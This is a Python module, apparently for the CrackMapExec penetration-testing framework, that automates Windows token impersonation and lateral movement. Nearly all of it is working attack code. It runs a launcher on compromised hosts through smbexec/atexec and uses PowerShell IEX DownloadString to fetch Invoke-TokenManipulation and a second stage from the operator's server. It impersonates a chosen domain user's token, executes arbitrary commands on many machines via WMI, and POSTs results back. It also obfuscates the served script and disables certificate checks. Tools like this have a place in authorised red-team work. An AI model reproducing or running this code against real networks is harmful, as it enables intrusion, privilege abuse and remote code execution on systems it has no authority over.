from StringIO import StringIO
from cme.helpers import create_ps_command, obfs_ps_script, get_ps_script
from base64 import b64encode
import sys
import os

class CMEModule:

    '''
        This module allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials:

        1) Invoke-TokenManipulation.ps1 is downloaded in memory and tokens are enumerated
        2) If a token is found for the specified user, a new powershell process is created (with the impersonated tokens privs)
        3) The new powershell process downloads a second stage and the specified command is then excuted on all target machines via WMI.

        Module by @byt3bl33d3r
    '''

    name = 'token_rider'

    description = 'Allows for automatic token enumeration, impersonation and mass lateral spread using privileges instead of dumped credentials'

    chain_support = True

    def options(self, context, module_options):
        '''
            TARGET   Target machine(s) to execute the command on (comma seperated)
            USER     User to impersonate
            DOMAIN   Domain of the user to impersonate
            COMMAND  Command to execute on the target system(s) (Required if CMDFILE isn't specified)
            CMDFILE  File contaning the command to execute on the target system(s) (Required if CMD isn't specified)
        '''

        if not 'TARGET' in module_options or not 'USER' in module_options or not 'DOMAIN' in module_options:
            context.log.error('TARGET, USER and DOMAIN options are required!')
            sys.exit(1)

        if not 'COMMAND' in module_options and not 'CMDFILE' in module_options:
            context.log.error('COMMAND or CMDFILE options are required!')
            sys.exit(1)

        if 'COMMAND' in module_options and 'CMDFILE' in module_options:
            context.log.error('COMMAND and CMDFILE are mutually exclusive!')
            sys.exit(1)

        self.target_computers = ''
        self.target_user = module_options['USER']
        self.target_domain = module_options['DOMAIN']

        if 'COMMAND' in module_options:
            self.command = module_options['COMMAND']

        elif 'CMDFILE' in module_options:
            path = os.path.expanduser(module_options['CMDFILE'])

            if not os.path.exists(path):
                context.log.error('Path to CMDFILE invalid!')
                sys.exit(1)

            with open(path, 'r') as cmdfile:
                self.command = cmdfile.read().strip() 

        targets = module_options['TARGET'].split(',')
        for target in targets:
            self.target_computers += '"{}",'.format(target)
        self.target_computers = self.target_computers[:-1]

        #context.log.debug('Target system string: {}'.format(self.target_computers))

    def launcher(self, context, command):
        second_stage = '''
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/TokenRider.ps1');'''.format(server=context.server, 
                                                                                                            addr=context.localip, 
                                                                                                            port=context.server_port)
        context.log.debug(second_stage)

        #Main launcher
        launcher = '''
        function Send-POSTRequest {{
            [CmdletBinding()]
            Param (
                [string] $data
            )
            $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
            $request.Method = 'POST';
            $request.ContentType = 'application/x-www-form-urlencoded';
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
            $request.ContentLength = $bytes.Length;
            $requestStream = $request.GetRequestStream();
            $requestStream.Write( $bytes, 0, $bytes.Length );
            $requestStream.Close();
            $request.GetResponse();
        }}

        IEX (New-Object Net.WebClient).DownloadString('{server}://{addr}:{port}/Invoke-TokenManipulation.ps1');
        $tokens = Invoke-TokenManipulation -Enum;
        foreach ($token in $tokens){{
            if ($token.Domain -eq "{domain}" -and $token.Username -eq "{user}"){{

                $token_desc = $token | Select-Object Domain, Username, ProcessId, IsElevated | Out-String;
                $post_back = "Found token for user " + ($token.Domain + '\\' + $token.Username) + "! `n";
                $post_back = $post_back + $token_desc;
                Send-POSTRequest $post_back

                Invoke-TokenManipulation -Username "{domain}\\{user}" -CreateProcess "cmd.exe" -ProcessArgs "/c powershell.exe -exec bypass -window hidden -noni -nop -encoded {second_stage}";
                return
            }}
        }}

        Send-POSTRequest "User token not present on system!"'''.format(second_stage=b64encode(second_stage.encode('UTF-16LE')),
                                                                       server=context.server,
                                                                       addr=context.localip,
                                                                       port=context.server_port,
                                                                       user=self.target_user,
                                                                       domain=self.target_domain)

        return create_ps_command(launcher)

    def payload(self, context, command):
        #This will get executed in the process that was created with the impersonated token
        payload = '''
        [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};
        function Send-POSTRequest {{
            [CmdletBinding()]
            Param (
                [string] $data
            )
            $request = [System.Net.WebRequest]::Create('{server}://{addr}:{port}/');
            $request.Method = 'POST';
            $request.ContentType = 'application/x-www-form-urlencoded';
            $bytes = [System.Text.Encoding]::ASCII.GetBytes($data);
            $request.ContentLength = $bytes.Length;
            $requestStream = $request.GetRequestStream();
            $requestStream.Write( $bytes, 0, $bytes.Length );
            $requestStream.Close();
            $request.GetResponse();
        }}

        $post_output = "";
        $targets = @({targets});
        foreach ($target in $targets){{
            try{{
                Invoke-WmiMethod -Path Win32_process -Name create -ComputerName $target -ArgumentList "{command}";
                $post_output = $post_output + "Executed command on $target! `n";
            }} catch {{
                $post_output = $post_output + "Error executing command on $target $_.Exception.Message `n";
            }}
        }}
        Send-POSTRequest $post_output'''.format(server=context.server, 
                                                addr=context.localip, 
                                                port=context.server_port,
                                                targets=self.target_computers,
                                                command=command)

        return payload

    def on_admin_login(self, context, connection, launcher, payload):
        connection.execute(launcher, methods=['smbexec', 'atexec'])
        context.log.success('Executed launcher')

    def on_request(self, context, request, launcher, payload):
        if 'Invoke-TokenManipulation.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            with open(get_ps_script('PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1'), 'r') as ps_script:
                ps_script = obfs_ps_script(ps_script.read())
                request.wfile.write(ps_script)

        elif 'TokenRider.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            #Command to execute on the target system(s)
            request.wfile.write(payload)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.getheader('content-length'))
        data = str(response.rfile.read(length))

        if len(data) > 0:

            if data.find('User token not present') != -1:
                response.stop_tracking_host()

            elif data.find('Executed command') != -1 or data.find('Error executing') != -1:
                response.stop_tracking_host()

            buf = StringIO(data.strip()).readlines()
            for line in buf:
                context.log.highlight(line.strip())
